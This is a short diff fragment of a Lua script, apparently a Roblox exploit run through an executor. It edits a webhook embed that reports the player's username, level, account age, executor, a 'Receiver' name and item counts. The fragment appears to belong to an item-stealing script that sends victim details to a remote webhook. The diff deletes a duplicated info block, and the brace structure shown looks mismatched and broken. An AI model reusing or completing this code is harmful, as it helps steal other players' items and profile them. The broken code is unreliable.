@@ -1069,11 +1069,6 @@ local WebHookEmbed = CreateEmbed(
             value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
                      "\n | 🥳 Receiver: "..userName.."```"
         },
-    {
-        {
-            name = "🌊 Player Info", 
-            value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."```"
         {
             name = "🍎 Items Data", 
             value = "```Uniques: "..tostring(uniqueItemsC)..
